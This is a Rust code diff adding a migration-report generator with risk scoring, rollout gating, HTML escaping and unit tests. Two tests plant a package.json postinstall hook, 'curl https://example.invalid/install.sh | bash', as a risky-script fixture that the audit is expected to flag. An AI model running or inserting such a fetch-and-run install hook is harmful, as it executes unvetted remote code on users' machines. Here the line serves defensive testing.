@@ -409,6 +409,88 @@ impl MigrationValidateReport {
     }
 }
 
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum OneCommandMigrationReportFormat {
+    Json,
+    Html,
+}
+
+impl OneCommandMigrationReportFormat {
+    pub fn parse(raw: &str) -> Result<Self, String> {
+        match raw.trim().to_ascii_lowercase().as_str() {
+            "json" => Ok(Self::Json),
+            "html" => Ok(Self::Html),
+            other => Err(format!(
+                "unsupported migrate-report format `{other}`; expected one of: json, html"
+            )),
+        }
+    }
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct MigrationReportExecutiveSummary {
+    pub recommendation: String,
+    pub go_no_go: String,
+    pub risk_score: u8,
+    pub confidence_score: u8,
+    pub high_findings: usize,
+    pub blocking_validation_checks: usize,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct MigrationReportApiInventory {
+    pub files_scanned: usize,
+    pub js_files: usize,
+    pub ts_files: usize,
+    pub package_manifests: usize,
+    pub lockfiles: Vec<String>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct MigrationReportRiskAssessment {
+    pub risk_score: u8,
+    pub high_findings: usize,
+    pub medium_findings: usize,
+    pub low_findings: usize,
+    pub info_findings: usize,
+    pub manual_review_items: usize,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct MigrationReportRolloutPhase {
+    pub name: String,
+    pub status: String,
+    pub gate: String,
+    pub evidence_refs: Vec<String>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct MigrationReportRolloutPlan {
+    pub phases: Vec<MigrationReportRolloutPhase>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct MigrationReportConfidence {
+    pub score: u8,
+    pub uncertainty_band: String,
+    pub factors: Vec<String>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct OneCommandMigrationReport {
+    pub schema_version: String,
+    pub project_path: String,
+    pub generated_at_utc: String,
+    pub executive_summary: MigrationReportExecutiveSummary,
+    pub api_inventory: MigrationReportApiInventory,
+    pub risk_assessment: MigrationReportRiskAssessment,
+    pub rewrite_suggestions: MigrationRewriteReport,
+    pub validation: MigrationValidateReport,
+    pub rollout_plan: MigrationReportRolloutPlan,
+    pub confidence: MigrationReportConfidence,
+    pub audit: MigrationAuditReport,
+}
+
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 struct MigrationRuntimeSmokeReceipt {
     schema_version: String,
@@ -1690,6 +1772,349 @@ pub fn run_validate(project_path: &Path) -> anyhow::Result<MigrationValidateRepo
         blocking_findings,
         warning_findings,
     })
+}
+
+pub fn run_one_command_report(project_path: &Path) -> anyhow::Result<OneCommandMigrationReport> {
+    let audit = run_audit(project_path)?;
+    let rewrite_suggestions = run_rewrite(project_path, false)?;
+    let validation = run_validate(project_path)?;
+    Ok(build_one_command_report(
+        project_path,
+        audit,
+        rewrite_suggestions,
+        validation,
+    ))
+}
+
+fn build_one_command_report(
+    project_path: &Path,
+    audit: MigrationAuditReport,
+    rewrite_suggestions: MigrationRewriteReport,
+    validation: MigrationValidateReport,
+) -> OneCommandMigrationReport {
+    let risk_assessment = build_migration_report_risk_assessment(&audit, &rewrite_suggestions);
+    let blocking_validation_checks = validation
+        .checks
+        .iter()
+        .filter(|check| !check.passed)
+        .count();
+    let go_no_go = migration_report_go_no_go(&risk_assessment, validation.is_pass()).to_string();
+    let confidence = build_migration_report_confidence(&risk_assessment, validation.is_pass());
+    let executive_summary = MigrationReportExecutiveSummary {
+        recommendation: migration_report_recommendation(&go_no_go).to_string(),
+        go_no_go,
+        risk_score: risk_assessment.risk_score,
+        confidence_score: confidence.score,
+        high_findings: risk_assessment.high_findings,
+        blocking_validation_checks,
+    };
+    let api_inventory = MigrationReportApiInventory {
+        files_scanned: audit.summary.files_scanned,
+        js_files: audit.summary.js_files,
+        ts_files: audit.summary.ts_files,
+        package_manifests: audit.summary.package_manifests,
+        lockfiles: audit.summary.lockfiles.clone(),
+    };
+    let rollout_plan =
+        build_migration_report_rollout_plan(&risk_assessment, &rewrite_suggestions, &validation);
+
+    OneCommandMigrationReport {
+        schema_version: "franken-node/migrate-report/v1".to_string(),
+        project_path: project_path.to_string_lossy().replace('\\', "/"),
+        generated_at_utc: chrono::Utc::now().to_rfc3339(),
+        executive_summary,
+        api_inventory,
+        risk_assessment,
+        rewrite_suggestions,
+        validation,
+        rollout_plan,
+        confidence,
+        audit,
+    }
+}
+
+fn build_migration_report_risk_assessment(
+    audit: &MigrationAuditReport,
+    rewrite: &MigrationRewriteReport,
+) -> MigrationReportRiskAssessment {
+    let mut high_findings = 0_usize;
+    let mut medium_findings = 0_usize;
+    let mut low_findings = 0_usize;
+    let mut info_findings = 0_usize;
+    for finding in &audit.findings {
+        match finding.severity {
+            MigrationSeverity::High => high_findings = high_findings.saturating_add(1),
+            MigrationSeverity::Medium => medium_findings = medium_findings.saturating_add(1),
+            MigrationSeverity::Low => low_findings = low_findings.saturating_add(1),
+            MigrationSeverity::Info => info_findings = info_findings.saturating_add(1),
+        }
+    }
+    let penalty = high_findings
+        .saturating_mul(30)
+        .saturating_add(medium_findings.saturating_mul(15))
+        .saturating_add(low_findings.saturating_mul(5))
+        .saturating_add(info_findings)
+        .saturating_add(rewrite.manual_review_items.saturating_mul(10));
+
+    MigrationReportRiskAssessment {
+        risk_score: bounded_percent_score(penalty),
+        high_findings,
+        medium_findings,
+        low_findings,
+        info_findings,
+        manual_review_items: rewrite.manual_review_items,
+    }
+}
+
+fn bounded_percent_score(value: usize) -> u8 {
+    match u8::try_from(value.min(100)) {
+        Ok(score) => score,
+        Err(_) => 100,
+    }
+}
+
+fn migration_report_go_no_go(
+    risk: &MigrationReportRiskAssessment,
+    validation_passed: bool,
+) -> &'static str {
+    if risk.high_findings > 0 || !validation_passed {
+        "no_go"
+    } else if risk.medium_findings > 0 || risk.manual_review_items > 0 {
+        "review"
+    } else {
+        "go"
+    }
+}
+
+fn migration_report_recommendation(go_no_go: &str) -> &'static str {
+    match go_no_go {
+        "go" => "Proceed with staged rollout after preserving rollback evidence.",
+        "review" => "Resolve manual-review items before default rollout.",
+        _ => {
+            "Do not roll out until blocking validation checks and high-severity findings are resolved."
+        }
+    }
+}
+
+fn build_migration_report_confidence(
+    risk: &MigrationReportRiskAssessment,
+    validation_passed: bool,
+) -> MigrationReportConfidence {
+    let validation_penalty = if validation_passed { 0 } else { 20 };
+    let confidence_score = 100_u8.saturating_sub(bounded_percent_score(
+        usize::from(risk.risk_score)
+            .saturating_div(2)
+            .saturating_add(validation_penalty),
+    ));
+    let uncertainty_band = if risk.high_findings > 0 || !validation_passed {
+        "high"
+    } else if risk.medium_findings > 0 || risk.manual_review_items > 0 {
+        "medium"
+    } else {
+        "low"
+    };
+    let mut factors = Vec::new();
+    push_bounded(
+        &mut factors,
+        format!("high_findings={}", risk.high_findings),
+        16,
+    );
+    push_bounded(
+        &mut factors,
+        format!("medium_findings={}", risk.medium_findings),
+        16,
+    );
+    push_bounded(
+        &mut factors,
+        format!("manual_review_items={}", risk.manual_review_items),
+        16,
+    );
+    push_bounded(
+        &mut factors,
+        format!("validation_passed={validation_passed}"),
+        16,
+    );
+
+    MigrationReportConfidence {
+        score: confidence_score,
+        uncertainty_band: uncertainty_band.to_string(),
+        factors,
+    }
+}
+
+fn build_migration_report_rollout_plan(
+    risk: &MigrationReportRiskAssessment,
+    rewrite: &MigrationRewriteReport,
+    validation: &MigrationValidateReport,
+) -> MigrationReportRolloutPlan {
+    let go_no_go = migration_report_go_no_go(risk, validation.is_pass());
+    let rewrite_status = if rewrite.rewrites_planned == 0 {
+        "no_changes"
+    } else if rewrite.manual_review_items > 0 {
+        "review_required"
+    } else {
+        "ready"
+    };
+    let rollout_status = match go_no_go {
+        "go" => "ready",
+        "review" => "manual_review",
+        _ => "blocked",
+    };
+    MigrationReportRolloutPlan {
+        phases: vec![
+            MigrationReportRolloutPhase {
+                name: "audit".to_string(),
+                status: "completed".to_string(),
+                gate: format!(
+                    "{} high findings, {} medium findings",
+                    risk.high_findings, risk.medium_findings
+                ),
+                evidence_refs: vec!["audit.findings".to_string(), "api_inventory".to_string()],
+            },
+            MigrationReportRolloutPhase {
+                name: "rewrite".to_string(),
+                status: rewrite_status.to_string(),
+                gate: format!(
+                    "{} rewrites planned, {} manual review items",
+                    rewrite.rewrites_planned, rewrite.manual_review_items
+                ),
+                evidence_refs: vec!["rewrite_suggestions.entries".to_string()],
+            },
+            MigrationReportRolloutPhase {
+                name: "validate".to_string(),
+                status: if validation.is_pass() { "pass" } else { "fail" }.to_string(),
+                gate: format!("{} validation checks", validation.checks.len()),
+                evidence_refs: vec!["validation.checks".to_string()],
+            },
+            MigrationReportRolloutPhase {
+                name: "rollout".to_string(),
+                status: rollout_status.to_string(),
+                gate: migration_report_recommendation(go_no_go).to_string(),
+                evidence_refs: vec![
+                    "executive_summary".to_string(),
+                    "confidence".to_string(),
+                    "rollout_plan".to_string(),
+                ],
+            },
+        ],
+    }
+}
+
+pub fn render_one_command_report(
+    report: &OneCommandMigrationReport,
+    format: OneCommandMigrationReportFormat,
+) -> anyhow::Result<String> {
+    match format {
+        OneCommandMigrationReportFormat::Json => serde_json::to_string_pretty(report)
+            .map_err(|err| anyhow::anyhow!("failed to serialize migrate-report JSON: {err}")),
+        OneCommandMigrationReportFormat::Html => Ok(render_one_command_report_html(report)),
+    }
+}
+
+fn render_one_command_report_html(report: &OneCommandMigrationReport) -> String {
+    let mut output = String::new();
+    let _ = writeln!(
+        &mut output,
+        "<!doctype html><html><head><meta charset=\"utf-8\"><title>franken-node migration report</title></head><body>"
+    );
+    let _ = writeln!(
+        &mut output,
+        "<h1>franken-node migration report</h1><p><strong>Target:</strong> {}</p>",
+        escape_html(&report.project_path)
+    );
+    let _ = writeln!(
+        &mut output,
+        "<section id=\"executive-summary\"><h2>Executive Summary</h2><p>go_no_go={} risk_score={} confidence_score={}</p><p>{}</p></section>",
+        escape_html(&report.executive_summary.go_no_go),
+        report.executive_summary.risk_score,
+        report.executive_summary.confidence_score,
+        escape_html(&report.executive_summary.recommendation)
+    );
+    let _ = writeln!(
+        &mut output,
+        "<section id=\"api-inventory\"><h2>API Inventory</h2><p>files={} js={} ts={} package_manifests={} lockfiles={}</p></section>",
+        report.api_inventory.files_scanned,
+        report.api_inventory.js_files,
+        report.api_inventory.ts_files,
+        report.api_inventory.package_manifests,
+        escape_html(&report.api_inventory.lockfiles.join(", "))
+    );
+    let _ = writeln!(
+        &mut output,
+        "<section id=\"risk-assessment\"><h2>Risk Assessment</h2><p>high={} medium={} low={} info={} manual_review_items={}</p></section>",
+        report.risk_assessment.high_findings,
+        report.risk_assessment.medium_findings,
+        report.risk_assessment.low_findings,
+        report.risk_assessment.info_findings,
+        report.risk_assessment.manual_review_items
+    );
+    let _ = writeln!(
+        &mut output,
+        "<section id=\"rewrite-suggestions\"><h2>Rewrite Suggestions</h2><p>planned={} applied={} manual_review_items={}</p><ul>",
+        report.rewrite_suggestions.rewrites_planned,
+        report.rewrite_suggestions.rewrites_applied,
+        report.rewrite_suggestions.manual_review_items
+    );
+    for entry in &report.rewrite_suggestions.entries {
+        let _ = writeln!(
+            &mut output,
+            "<li>{}: {} {}</li>",
+            escape_html(&entry.id),
+            escape_html(&format!("{:?}", entry.action)),
+            escape_html(&entry.detail)
+        );
+    }
+    let _ = writeln!(&mut output, "</ul></section>");
+    let _ = writeln!(
+        &mut output,
+        "<section id=\"validation\"><h2>Validation</h2><p>status={:?}</p><ul>",
+        report.validation.status
+    );
+    for check in &report.validation.checks {
+        let _ = writeln!(
+            &mut output,
+            "<li>{}: {} {}</li>",
+            escape_html(&check.id),
+            if check.passed { "PASS" } else { "FAIL" },
+            escape_html(&check.message)
+        );
+    }
+    let _ = writeln!(&mut output, "</ul></section>");
+    let _ = writeln!(
+        &mut output,
+        "<section id=\"rollout-plan\"><h2>Rollout Plan</h2><ol>"
+    );
+    for phase in &report.rollout_plan.phases {
+        let _ = writeln!(
+            &mut output,
+            "<li><strong>{}</strong>: status={} gate={}</li>",
+            escape_html(&phase.name),
+            escape_html(&phase.status),
+            escape_html(&phase.gate)
+        );
+    }
+    let _ = writeln!(
+        &mut output,
+        "</ol></section><section id=\"confidence\"><h2>Confidence</h2><p>score={} uncertainty_band={}</p></section></body></html>",
+        report.confidence.score,
+        escape_html(&report.confidence.uncertainty_band)
+    );
+    output
+}
+
+fn escape_html(value: &str) -> String {
+    let mut escaped = String::with_capacity(value.len());
+    for ch in value.chars() {
+        match ch {
+            '&' => escaped.push_str("&amp;"),
+            '<' => escaped.push_str("&lt;"),
+            '>' => escaped.push_str("&gt;"),
+            '"' => escaped.push_str("&quot;"),
+            '\'' => escaped.push_str("&#39;"),
+            _ => escaped.push(ch),
+        }
+    }
+    escaped
 }
 
 #[must_use]
@@ -4321,6 +4746,77 @@ mod tests {
             Ok(AuditOutputFormat::Sarif)
         );
         assert!(AuditOutputFormat::parse("yaml").is_err());
+    }
+
+    #[test]
+    fn parse_one_command_migration_report_format_is_case_insensitive() {
+        assert_eq!(
+            OneCommandMigrationReportFormat::parse("json"),
+            Ok(OneCommandMigrationReportFormat::Json)
+        );
+        assert_eq!(
+            OneCommandMigrationReportFormat::parse("HTML"),
+            Ok(OneCommandMigrationReportFormat::Html)
+        );
+        assert!(OneCommandMigrationReportFormat::parse("sarif").is_err());
+    }
+
+    #[test]
+    fn run_one_command_report_composes_sections_without_applying_rewrites() {
+        let temp = tempfile::tempdir().expect("tempdir");
+        let project = temp.path();
+        write_project_file(project, "index.js", "const fs = require(\"fs\");\n");
+        write_project_file(
+            project,
+            "package.json",
+            r#"{
+              "name":"demo-report",
+              "version":"1.0.0",
+              "scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"}
+            }"#,
+        );
+        let original_manifest =
+            std::fs::read_to_string(project.join("package.json")).expect("read manifest");
+
+        let report = run_one_command_report(project).expect("one-command report");
+
+        assert_eq!(report.schema_version, "franken-node/migrate-report/v1");
+        assert_eq!(report.executive_summary.go_no_go, "no_go");
+        assert!(report.executive_summary.risk_score > 0);
+        assert_eq!(report.api_inventory.package_manifests, 1);
+        assert_eq!(report.audit.summary.risky_scripts, 1);
+        assert!(!report.rewrite_suggestions.apply_mode);
+        assert!(!report.validation.is_pass());
+        assert_eq!(report.rollout_plan.phases.len(), 4);
+        assert_eq!(
+            std::fs::read_to_string(project.join("package.json")).expect("read manifest"),
+            original_manifest
+        );
+    }
+
+    #[test]
+    fn render_one_command_report_html_escapes_project_path() {
+        let temp = tempfile::tempdir().expect("tempdir");
+        let project = temp.path().join("project<unsafe&name>");
+        write_project_file(&project, "index.js", "const fs = require(\"fs\");\n");
+        write_project_file(
+            &project,
+            "package.json",
+            r#"{
+              "name":"demo-report",
+              "version":"1.0.0",
+              "scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"}
+            }"#,
+        );
+
+        let report = run_one_command_report(&project).expect("one-command report");
+        let html = render_one_command_report(&report, OneCommandMigrationReportFormat::Html)
+            .expect("HTML report");
+
+        assert!(html.contains("project&lt;unsafe&amp;name&gt;"));
+        assert!(!html.contains("project<unsafe&name>"));
+        assert!(html.contains("<section id=\"executive-summary\">"));
+        assert!(html.contains("<section id=\"rollout-plan\">"));
     }
 
     #[test]
